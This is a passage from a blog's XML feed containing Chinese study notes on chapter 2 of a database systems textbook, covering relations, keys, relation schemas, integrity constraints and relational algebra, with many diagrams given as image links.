<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>《数据库系统概论》第二章</title>
    <url>/2021/03/23/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0/</url>
    <content><![CDATA[<p>《数据库系统概论》第二章</p>
<a id="more"></a>

<h1 id="2-1关系数据结构及形式化定义"><a href="#2-1关系数据结构及形式化定义" class="headerlink" title="2.1关系数据结构及形式化定义"></a>2.1关系数据结构及形式化定义</h1><p><strong>思维导图</strong></p>
<p><img src="https://img.npfs06.top/20210323124000.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="1-关系"><a href="#1-关系" class="headerlink" title="1. 关系"></a>1. 关系</h2><p><strong>什么是关系？</strong></p>
<ul>
<li>单一的数据结构—-关系<br>现实世界的<code>实体以及实体间的各种联系</code>均用关系来表示</li>
<li>逻辑结构—-二维表<br>从用户角度，<code>关系模型中数据的逻辑结构</code>是一张<code>二维表</code></li>
<li>建立在集合代数的基础上</li>
</ul>
<h3 id="（1）域（Domain）"><a href="#（1）域（Domain）" class="headerlink" title="（1）域（Domain）"></a>（1）域（Domain）</h3><ul>
<li><code>域</code>是一组具有<code>相同数据类型的值的集合</code>。例:<br>整数<br>实数<br>介于某个取值范围的整数<br>长度指定长度的字符串集合<br>{‘男’，‘女’}<br>………………</li>
</ul>
<h3 id="（2）笛卡尔积（Cartesian-Product）"><a href="#（2）笛卡尔积（Cartesian-Product）" class="headerlink" title="（2）笛卡尔积（Cartesian Product）"></a>（2）笛卡尔积（Cartesian Product）</h3><ul>
<li><code>笛卡尔积</code><br>给定一组域D1，D2，…，Dn，这些域中可以有相同的。<br>D1，D2，…，Dn的<code>笛卡尔积</code>为：<br><img src="https://img.npfs06.top/20210323124037.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><code>所有域的所有取值的一个组合</code>；<br>不能重复；</li>
<li><code>元组</code>（Tuple）<br><code>笛卡尔积中每一个元素</code>（d1，d2，…，dn）叫作<code>一个n元组</code>（n-tuple）或简称<code>元组</code>(Tuple);<br>(张清玫，计算机专业，李勇)、(张清玫，计算机专业，刘晨)等都是元组 ;</li>
<li><code>分量</code>（Component）<br>笛卡尔积元素（d1，d2，…，dn）中的每一个值di叫作一个<code>分量</code>;<br>张清玫、计算机专业、李勇、刘晨等都是<code>分量</code> ;</li>
<li><code>基数</code>（Cardinal number）<br>可以把基数看做笛卡尔积元素的个数，及元组的个数；<br>若Di（i＝1，2，…，n）为有限集，其<code>基数</code>为mi（i＝1，2，…，n），则D1×D2×…×Dn的基数M为：<br><img src="http://img.npfs06.top/20210323124049.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
<li>笛卡尔积的表示方法:<br>笛卡尔积可表示为一个<code>二维表</code>;<br>表中的<code>每行</code>对应一个<code>元组</code>，表中的每列对应一个<code>域</code>;<br><img src="http://img.npfs06.top/20210323124059.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<h3 id="（3）关系（Relation）"><a href="#（3）关系（Relation）" class="headerlink" title="（3）关系（Relation）"></a>（3）关系（Relation）</h3><ul>
<li><code>关系</code><br><code>·笛卡尔积·</code>D1×D2×…×Dn的<code>子集</code>叫作在<code>域</code>D1，D2，…，Dn上的<code>关系</code>，表示为：<br><img src="http://img.npfs06.top/20210323124112.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br>R：关系名<br>n：关系的<code>目</code>或<code>度</code>（Degree）</li>
<li><code>元组</code><br><code>·关系·</code>中的每个元素是关系中的<code>元组</code>，通常用t表示。</li>
<li><code>单元关系与二元关系</code><br>当n=1时，称该关系为<code>单元关系</code>（Unary relation）或<code>一元关系</code> ;<br>当n=2时，称该关系为<code>二元关系</code>（Binary relation）;</li>
<li><code>·关系的表示·</code><br>关系也是一个<code>二维表</code>，表的<code>每行</code>对应一个<code>元组</code>，表的每<code>列</code>对应一个<code>域</code><br><img src="http://img.npfs06.top/20210323124124.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
<li><code>属性</code><br>关系中不同列可以对应相同的域;<br>为了加以区分，必须对每<code>列</code>起一个<code>名字</code>，称为<code>属性</code>（Attribute）;<br>n目关系必有n个属性;</li>
<li><code>码</code><ul>
<li><code>候选码</code>（Candidate key）<br>若关系中的某一<code>属性组</code>的值能<code>唯一地标识一个元组</code>，则称该属性组为候选码;<br>简单的情况：候选码只包含一个属性;</li>
<li><code>全码</code>（All-key）<br>最极端的情况：<code>关系模式的所有属性组是这个关系模式的候选码，称为全码</code>（All-key）;</li>
<li><code>主码</code><br>若一个关系有<code>多个候选码</code>，则<code>选定其中一个为主码</code>（Primary key）;</li>
<li><code>主属性</code><br><code>候选码的诸属性称为主属性</code>（Prime attribute）;<br><code>不包含在任何侯选码中的属性称为非主属性</code>（ Non-Prime attribute）或非码属性（Non-key attribute） ;<br><img src="http://img.npfs06.top/20210323124140.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
</li>
<li>D1，D2，…，Dn的笛卡尔积的<code>某个子集才有实际含义</code><br><code>·例：·</code>表2.1 的笛卡尔积<code>没有实际意义</code><br><code>取出有实际意义的元组</code>来构造关系<br>关系：SAP(SUPERVISOR，SPECIALITY，POSTGRADUATE)<br>假设：导师与专业：1:1， 导师与研究生：1:n<br>主码：POSTGRADUATE（假设研究生不会重名）<br>SAP关系可以包含三个元组:｛ (张清玫，计算机专业，李勇)， (张清玫，计算机专业，刘晨)，(刘逸，信息专业，王敏) }</li>
</ul>
<h3 id="（4）三类关系"><a href="#（4）三类关系" class="headerlink" title="（4）三类关系"></a>（4）三类关系</h3><ul>
<li><code>基本关系</code>（基本表或基表）<br>实际存在的表，是实际存储数据的逻辑表示</li>
<li><code>查询表</code><br>查询结果对应的表</li>
<li><code>视图表</code><br>由基本表或其他视图表导出的表，是虚表，不对应实际存储的数据</li>
</ul>
<blockquote>
<ul>
<li>在 SQL 中，<code>视图是基于 SQL 语句的结果集的可视化的表</code>。</li>
<li>视图包含行和列，就像一个真实的表。视图中的字段就是来自一个或多个数据库中的真实的表中的字段。</li>
<li>我们可以向视图添加 SQL 函数、WHERE 以及 JOIN 语句，我们也可以提交数据，就像这些来自于某个单一的表。</li>
<li>注释：数据库的设计和结构不会受到视图中的函数、where 或 join 语句的影响。</li>
</ul>
</blockquote>
<ul>
<li><code>基本关系(二维表)的性质</code><br>① 列是同质的（Homogeneous）;<br>② 不同的列可出自同一个域,其中的每一列称为一个属性,不同的属性要给予不同的属性名;<br>③ 列的顺序无所谓，列的次序可以任意交换;<br>④ 任意两个元组的候选码不能相同;<br>⑤ 行的顺序无所谓，行的次序可以任意交换;<br>⑥ 分量必须取原子值,这是规范条件中最基本的一条; <img src="http://img.npfs06.top/20210323124152.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<h2 id="2-关系模式"><a href="#2-关系模式" class="headerlink" title="2.关系模式"></a>2.关系模式</h2><h3 id="（1）什么是关系模式"><a href="#（1）什么是关系模式" class="headerlink" title="（1）什么是关系模式"></a>（1）什么是关系模式</h3><p><strong>关系模式（Relation Schema）是型</strong><br><strong>关系是值</strong><br><strong>关系模式是对关系的描述:</strong></p>
<ul>
<li>元组集合的结构<ul>
<li>属性构成</li>
<li>属性来自的域</li>
<li>属性与域之间的映象关系</li>
</ul>
</li>
<li>元组语义以及完整性约束条件</li>
<li>属性间的数据依赖关系集合</li>
</ul>
<h3 id="（2）定义关系模式"><a href="#（2）定义关系模式" class="headerlink" title="（2）定义关系模式"></a>（2）定义关系模式</h3><p><strong>关系模式可以形式化地表示为：</strong></p>
<ul>
<li>R（U，D，DOM，F）</li>
<li>R 关系名</li>
<li>U 组成该关系的属性名集合</li>
<li>D 属性组U中属性所来自的域</li>
<li>DOM 属性向域的映象集合</li>
<li>F 属性间的数据依赖关系集合</li>
</ul>
<p><code>·例:·</code><br>导师和研究生出自同一个域——人，取不同的属性名，并在模式中定义属性向域的映象，即说明它们分别出自哪个域;<br>DOM（SUPERVISOR-PERSON）= DOM（POSTGRADUATE-PERSON）=PERSON</p>
<p><strong>关系模式通常可以简记为</strong><br>R (U) 或 R (A1，A2，…，An)<br>R: 关系名<br>A1，A2，…，An : 属性名<br>注：域名及属性向域的映象常常直接说明为属性的类型、长度</p>
<h2 id="3-关系模式和关系的对比"><a href="#3-关系模式和关系的对比" class="headerlink" title="3.关系模式和关系的对比"></a>3.关系模式和关系的对比</h2><ul>
<li><strong>关系模式</strong><br>对关系的描述<br>静态的、稳定的</li>
<li><strong>关系</strong><br>关系模式在某一时刻的状态或内容<br>动态的、随时间不断变化的<br>关系模式和关系往往统称为关系</li>
</ul>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在数据库学科中可以把关系模式理解为表的结构、属性之间的关系、约束条件，把关系理解为二维表</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="4-关系数据库"><a href="#4-关系数据库" class="headerlink" title="4.关系数据库"></a>4.关系数据库</h2><ul>
<li><code>关系数据库·</code><br>在一个给定的应用领域中，所有·关系的集合·构成一个关系数据库</li>
<li>·<code>关系数据库模式</code>包括<br>若干域的定义;<br>在这些域上定义的若干关系模式;</li>
<li><code>关系数据库</code>的·<code>型</code>·与<code>值</code><br>关系数据库的<code>型</code>: <code>关系数据库模式</code>, 对关系数据库的描述。<br>关系数据库的<code>值</code>: 关系模式在<code>某一时刻对应的关系的集合</code>，简称为关系数据库</li>
</ul>
<h1 id="2-2-关系操作、关系完整性、关系代数"><a href="#2-2-关系操作、关系完整性、关系代数" class="headerlink" title="2.2 关系操作、关系完整性、关系代数"></a>2.2 关系操作、关系完整性、关系代数</h1><h2 id="1-关系操作"><a href="#1-关系操作" class="headerlink" title="1.关系操作"></a>1.关系操作</h2><h3 id="（1）基本关系操作"><a href="#（1）基本关系操作" class="headerlink" title="（1）基本关系操作"></a>（1）基本关系操作</h3><ul>
<li>常用的关系操作<ul>
<li>查询：选择、投影、连接、除、并、交、差</li>
<li>数据更新：插入、删除、修改</li>
<li>查询的表达能力是其中最主要的部分</li>
<li>选择、投影、并、差、笛卡尔基是5种基本操作</li>
</ul>
</li>
<li>关系操作的特点<ul>
<li>集合操作方式：操作的对象和结果都是集合，<code>一次一集合</code>的方式</li>
</ul>
</li>
</ul>
<h3 id="（2）关系数据库语言的分类"><a href="#（2）关系数据库语言的分类" class="headerlink" title="（2）关系数据库语言的分类"></a>（2）关系数据库语言的分类</h3><ul>
<li><strong>关系代数语言</strong><br>用对关系的运算来表达查询要求；<br>代表：ISBL；<br>关系演算语言：用谓词来表达查询要求；</li>
<li><strong>元组关系演算语言</strong><br>谓词变元的基本对象是元组变量；<br>代表：APLHA, QUEL；</li>
<li><strong>域关系演算语言</strong><br>谓词变元的基本对象是域变量；<br>代表：QBE；</li>
<li>具有关系代数和关系演算双重特点的语言；<br>代表：SQL（Structured Query Language） ；</li>
</ul>
<h2 id="2-关系的完整性"><a href="#2-关系的完整性" class="headerlink" title="2.关系的完整性"></a>2.关系的完整性</h2><h3 id="（1）关系的三类完整性约束"><a href="#（1）关系的三类完整性约束" class="headerlink" title="（1）关系的三类完整性约束"></a>（1）关系的三类完整性约束</h3><ul>
<li><strong>实体完整性和参照完整性：</strong><br>关系模型必须满足的完整性约束条件;<br>称为关系的<code>两个不变性</code>，应该由关系系统自动支持;</li>
<li><strong>用户定义的完整性：</strong><br>应用领域需要遵循的约束条件，体现了具体领域中的语义约束 ;</li>
</ul>
<h3 id="（2）-实体完整性（Entity-Integrity）"><a href="#（2）-实体完整性（Entity-Integrity）" class="headerlink" title="（2） 实体完整性（Entity Integrity）"></a>（2） 实体完整性（Entity Integrity）</h3><ul>
<li>若属性A是基本关系R的主属性，则属性A不能取空值</li>
<li><code>例：</code><br>SAP(SUPERVISOR，SPECIALITY，POSTGRADUATE)<br>POSTGRADUATE：<br>主码（假设研究生不会重名）<br>不能取空值</li>
<li>实体完整性规则的说明<br>(1) 实体完整性规则是针对基本关系而言的。一个基本表通常对应现 实世界的一个实体集。<br>(2) 现实世界中的实体是可区分的，即它们具有某种唯一性标识。<br>(3) 关系模型中以主码作为唯一性标识。<br>(4) 主码中的属性即主属性不能取空值。主属性取空值，就说明存在某个不可标识的实体，即存在不可区分的实体，这与第（2）点相矛盾，因此这个规则称为实体完整性</li>
</ul>
<h3 id="（3）参照完整性"><a href="#（3）参照完整性" class="headerlink" title="（3）参照完整性"></a>（3）参照完整性</h3><h5 id="关系间的引用"><a href="#关系间的引用" class="headerlink" title="关系间的引用"></a>关系间的引用</h5><p><img src="http://img.npfs06.top/20210323124223.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210323124235.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><img src="http://img.npfs06.top/20210323124245.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h5 id="外码（Foreign-Key）"><a href="#外码（Foreign-Key）" class="headerlink" title="外码（Foreign Key）"></a>外码（Foreign Key）</h5><ul>
<li><p>设F是基本关系R的一个或一组属性，但不是关系R的码。如果F与基本关系S的主码Ks相对应，则称F是基本关系R的<code>外码</code>,即该码是另一个表的主码。</p>
</li>
<li><p>基本关系R称为<code>参照关系</code>（Referencing Relation），即本表。</p>
</li>
<li><p>基本关系S称为<code>被参照关系</code>（Referenced Relation） 或<code>目标关系</code>（Target Relation），即外码对应的主码所在的表。<br><img src="http://img.npfs06.top/20210323124256.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323124310.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
</li>
<li><p><img src="http://img.npfs06.top/20210323124323.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
</li>
<li><p>关系R和S不一定是不同的关系</p>
</li>
<li><p>目标关系S的主码Ks 和参照关系的外码F必须定义在同一个（或一组）域上</p>
</li>
<li><p>外码并不一定要与相应的主码同名，当外码与相应的主码属于不同关系时，往往取相同的名 字，以便于识别</p>
</li>
</ul>
<h5 id="参照完整性规则"><a href="#参照完整性规则" class="headerlink" title="参照完整性规则"></a>参照完整性规则</h5><p>若属性（或属性组）F是基本关系R的外码它与基本关系S的主码Ks相对应（基本关系R和S不一定是不同的关系），则对于R中每个元组在F上的值必须为：</p>
<ul>
<li>或者取空值（F的每个属性值均为空值）</li>
<li>或者等于S中某个元组的主码值</li>
<li>外码的值要么为空，要么为S中某个元组的主码值<br><img src="http://img.npfs06.top/20210323124337.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><img src="https://img.npfs06.top/20210323124354.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
<li><img src="http://img.npfs06.top/20210323124419.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
<li></li>
</ul>
<h4 id="（4）用户定义的完整性"><a href="#（4）用户定义的完整性" class="headerlink" title="（4）用户定义的完整性"></a>（4）用户定义的完整性</h4><ul>
<li>针对某一具体关系数据库的约束条件，反映某一具体应用所涉及的数据必须满足的语义要求</li>
<li>关系模型应提供定义和检验这类完整性的机制，以便用统一的系统的方法处理它们，而不要由应用程序承担这一功能<br><img src="http://img.npfs06.top/20210323124432.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<h2 id="3-关系代数"><a href="#3-关系代数" class="headerlink" title="3.关系代数"></a>3.关系代数</h2><h3 id="（1）关系代数运算符"><a href="#（1）关系代数运算符" class="headerlink" title="（1）关系代数运算符"></a>（1）关系代数运算符</h3><p><img src="http://img.npfs06.top/20210323124442.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323124453.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h3 id="（2）传统的集合运算"><a href="#（2）传统的集合运算" class="headerlink" title="（2）传统的集合运算"></a>（2）传统的集合运算</h3><h4 id="①-并（Union）"><a href="#①-并（Union）" class="headerlink" title="① 并（Union）"></a>① 并（Union）</h4><p><img src="http://img.npfs06.top/20210323124505.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323124515.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="②-差（Difference）"><a href="#②-差（Difference）" class="headerlink" title="② 差（Difference）"></a>② 差（Difference）</h4><p><img src="http://img.npfs06.top/20210323124526.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323124536.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="③-交（Intersection）"><a href="#③-交（Intersection）" class="headerlink" title="③ 交（Intersection）"></a>③ 交（Intersection）</h4><p><img src="http://img.npfs06.top/20210323124558.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210323124611.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323124621.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="④-笛卡尔积（Cartesian-Product）"><a href="#④-笛卡尔积（Cartesian-Product）" class="headerlink" title="④ 笛卡尔积（Cartesian Product）"></a>④ 笛卡尔积（Cartesian Product）</h4><p><img src="http://img.npfs06.top/20210323124633.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323124643.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h3 id="（3）专门的关系运算"><a href="#（3）专门的关系运算" class="headerlink" title="（3）专门的关系运算"></a>（3）专门的关系运算</h3><h4 id="①-几个记号"><a href="#①-几个记号" class="headerlink" title="① 几个记号"></a>① 几个记号</h4><p><img src="http://img.npfs06.top/20210323124657.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323124710.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323124719.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323124729.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323124739.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><img src="http://img.npfs06.top/20210323124749.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323124759.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323124808.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="②-选择（Selection）"><a href="#②-选择（Selection）" class="headerlink" title="② 选择（Selection）"></a>② 选择（Selection）</h4><p><img src="http://img.npfs06.top/20210323124819.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323124828.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210323124844.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210323124904.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="③-投影（Projection）"><a href="#③-投影（Projection）" class="headerlink" title="③ 投影（Projection）"></a>③ 投影（Projection）</h4><p><img src="http://img.npfs06.top/20210323124913.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323124923.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323124933.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210323124948.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323125000.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="④-连接（Join）"><a href="#④-连接（Join）" class="headerlink" title="④ 连接（Join）"></a>④ 连接（Join）</h4><p><img src="http://img.npfs06.top/20210323125016.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323125028.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323125039.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323125049.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323125100.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323125109.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323125124.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323125139.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
